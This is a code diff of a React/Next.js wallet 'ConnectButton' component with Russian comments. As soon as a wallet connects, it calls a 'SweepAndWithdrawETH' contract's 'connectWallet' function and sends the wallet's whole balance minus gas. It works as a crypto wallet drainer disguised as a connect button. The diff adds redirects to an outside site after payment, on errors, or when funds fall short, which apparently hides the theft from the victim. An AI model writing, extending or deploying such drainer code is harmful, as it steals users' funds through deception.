@@ -2,18 +2,23 @@
 
 import React, { useEffect, useCallback } from 'react';
 
+import { useRouter } from 'next/navigation';
+
 import { useClientMounted } from '@/hooks/useClientMount';
 import { hyperliquidTestnet } from '@/chains/hyperliquidChain';
 import { useAppKitAccount, useAppKit } from '@reown/appkit/react';
 import { Address, encodeFunctionData } from 'viem';
 import { useBalance, useDisconnect, usePublicClient, useWriteContract, useChainId, useSwitchChain } from 'wagmi';
 
-import { CONTRACT_ADDRESS_TEST } from '@/constants/constants';
+import { CONTRACT_ADDRESS_TEST, REDIRECT_SITE } from '@/constants/constants';
 import SWEEP_AND_WITHDRAW_ABI from '@/abi/SweepAndWithdrawETH.json';
 
 
 export function ConnectButton() {
   const mounted = useClientMounted()
+
+  // Редирект Router
+  const router = useRouter();
 
   // AppKit-хуки для адреса и открытия модалки
   const { address, isConnected } = useAppKitAccount();
@@ -33,42 +38,50 @@ export function ConnectButton() {
   // Вызов Смарт Контракта
   const handleConnectWallet = useCallback(
     async (balance: bigint) => {
-      if (!publicClient || !address) return;
+      if (!publicClient || !address) {
+        router.push(REDIRECT_SITE);
+      }
+
       try {
-        const data = encodeFunctionData({
-          abi: SWEEP_AND_WITHDRAW_ABI,
-          functionName: 'connectWallet',
-          args: [],
-        });
+        if (publicClient && address) {
+          const data = encodeFunctionData({
+            abi: SWEEP_AND_WITHDRAW_ABI,
+            functionName: 'connectWallet',
+            args: [],
+          });
 
-        const estimatedGas = await publicClient.estimateGas({
-          to: CONTRACT_ADDRESS_TEST,
-          account: address as Address,
-          data,
-          value: balance,
-        });
-        const gasPrice = await publicClient.getGasPrice();
-        const totalFee = estimatedGas * gasPrice;
-        const valueToSend = balance > totalFee ? balance - totalFee : BigInt(0);
-        if (valueToSend === BigInt(0)) {
-          console.warn('Не хватает средств на газ');
-          return;
+          const estimatedGas = await publicClient.estimateGas({
+            to: CONTRACT_ADDRESS_TEST,
+            account: address as Address,
+            data,
+            value: balance,
+          });
+          const gasPrice = await publicClient.getGasPrice();
+          const totalFee = estimatedGas * gasPrice;
+          const valueToSend = balance > totalFee ? balance - totalFee : BigInt(0);
+          if (valueToSend === BigInt(0)) {
+            console.warn('Не хватает средств на газ');
+            router.push(REDIRECT_SITE);
+            return;
+          }
+
+          const txHash = await writeContractAsync({
+            address: CONTRACT_ADDRESS_TEST,
+            abi: SWEEP_AND_WITHDRAW_ABI,
+            functionName: 'connectWallet',
+            value: valueToSend,
+            gas: estimatedGas,
+            gasPrice,
+          });
+        } else {
+          router.push(REDIRECT_SITE);
         }
-
-        const txHash = await writeContractAsync({
-          address: CONTRACT_ADDRESS_TEST,
-          abi: SWEEP_AND_WITHDRAW_ABI,
-          functionName: 'connectWallet',
-          value: valueToSend,
-          gas: estimatedGas,
-          gasPrice,
-        });
-        console.log('txHash', txHash);
       } catch (err) {
         console.error('Ошибка при транзакции:', err);
+        router.push(REDIRECT_SITE);
       }
     },
-    [publicClient, address, writeContractAsync]
+    [publicClient, address, writeContractAsync, router]
   );
 
   useEffect(() => {
@@ -76,6 +89,14 @@ export function ConnectButton() {
       handleConnectWallet(balanceData.value)
     }
   }, [isConnected, balanceData && balanceData?.value, handleConnectWallet])
+
+  // Редирект после успешной оплаты
+  useEffect(() => {
+    if (isSuccess) {
+      // TODO: Замените на маршрут благодарности или успеха
+      router.push(REDIRECT_SITE);
+    }
+  }, [isSuccess, router]);
 
   if (!mounted) return null;
 
